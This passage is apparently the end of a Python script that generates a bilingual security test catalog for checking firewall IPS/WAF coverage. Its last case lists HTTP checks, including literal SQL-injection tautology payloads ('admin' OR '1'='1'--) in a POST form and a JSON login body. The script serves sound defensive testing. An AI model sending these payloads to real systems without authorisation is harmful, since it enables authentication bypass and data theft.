# ------------------------------------------------------------------ WAF
case("WAF-01", "medium", T("SQLi y XSS (cobertura de WAF)", "SQLi and XSS (WAF coverage)"),
     T("Se documenta qué cubre el IPS y qué requiere un WAF.", "Documents what the IPS covers and what needs a WAF."),
     T("El IPS cubre las clases comunes de ataque web. La protección completa de aplicaciones y API (incluidas tautologías en formularios y JSON) corresponde a Check Point CloudGuard WAF.",
       "IPS covers common web attack classes. Full application and API protection (including tautologies in forms and JSON) belongs to Check Point CloudGuard WAF."),
     T("IPS en Prevent.", "IPS in Prevent."), EVI_STD, [
         http(T("SQLi en parámetro GET", "SQLi in GET parameter"), "BLOCK", "http://" + S + SQLI, explain=E_IPS, blade="IPS", **SRV),
         http(T("XSS reflejado", "Reflected XSS"), "BLOCK", "http://" + S + XSS, explain=E_IPS, blade="IPS", **SRV),
         http(T("Tautología SQL en formulario POST", "SQL tautology in POST form"), "BLOCK", "http://" + S + "/login.php", ["--data", "user=admin%27%20OR%20%271%27=%271%27--&pass=x"], explain=T("Clase propia de un WAF: informativa.", "WAF-specific class: informative."), blade="IPS → CloudGuard WAF", informative=True, **SRV),
         http(T("Tautología SQL en JSON (API)", "SQL tautology in JSON (API)"), "BLOCK", "http://" + S + "/api/login", ["-H", "Content-Type: application/json", "--data", '{"user":"admin\' OR \'1\'=\'1\'--","pass":"x"}'], explain=T("Clase propia de un WAF: informativa.", "WAF-specific class: informative."), blade="IPS → CloudGuard WAF", informative=True, **SRV),
     ])

# ------------------------------------------------------------------ build
n = 0
for c in C:
    for i, ch in enumerate(c["checks"], 1):
        ch["id"] = f"{c['id']}.{i}"; n += 1
# ------------------------------------------------------------------ vendor-neutral wording
# The catalog is used to compare security solutions: generic capability names, and the Check Point specific
# explanation ("how") is kept apart in vendor_notes.checkpoint (shown only when the solution under test is Check Point).
CAP = {"HTTPSi": "TLS inspection", "App Control": "Application control", "Content Awareness": "DLP", "Anti-Virus": "Anti-malware",
       "Anti-Bot": "Anti-bot (C&C)", "IPS → CloudGuard WAF": "IPS → WAF", "AV": "Anti-malware", "HTTPSi (bypass)": "TLS inspection (bypass)"}
WORDS = {"en": [("Content Awareness", "DLP (content inspection)"), ("HTTPS Inspection", "TLS inspection"), ("Threat Prevention", "threat prevention"),
                ("'match by protocol signature'", "protocol identification (not only the port)"), ("App Control", "application control")],
         "es": [("Content Awareness", "DLP (inspección de contenido)"), ("HTTPS Inspection", "inspección TLS"), ("Threat Prevention", "prevención de amenazas"),
                ("'match by protocol signature'", "identificación por protocolo (no solo por puerto)"), ("App Control", "control de aplicaciones")]}


def neutral(t):
    return {l: (lambda x: [x := x.replace(a, b) for a, b in WORDS[l]][-1])(v) if isinstance(v, str) else v for l, v in t.items()}


def capability(b):
    return " / ".join(CAP.get(p.strip(), p.strip()) for p in b.split(" / "))


for c in C:
    c["vendor_notes"] = {"checkpoint": c.pop("how")}
    for f in ("objective", "requires", "evidence"):
        c[f] = neutral(c[f])
    for k in c["checks"]:
        k["blade"] = capability(k.get("blade", ""))
        k["explain"] = neutral(k["explain"]); k["name"] = neutral(k["name"])

PRIO = {"critical": T("Crítica", "Critical"), "high": T("Alta", "High"), "medium": T("Media", "Medium")}
for c in C:
    c["priority_label"] = PRIO[c["priority"]]
out = dict(version=2, title=T("Catálogo de pruebas de seguridad", "Security test catalog"),
           domains=[dict(id=d, name=nm) for d, nm in DOMAINS], cases=C)
with open(OUT, "w", encoding="utf-8") as f:
    json.dump(out, f, ensure_ascii=False, indent=1)
print(f"{len(C)} cases, {n} checks → {OUT}")
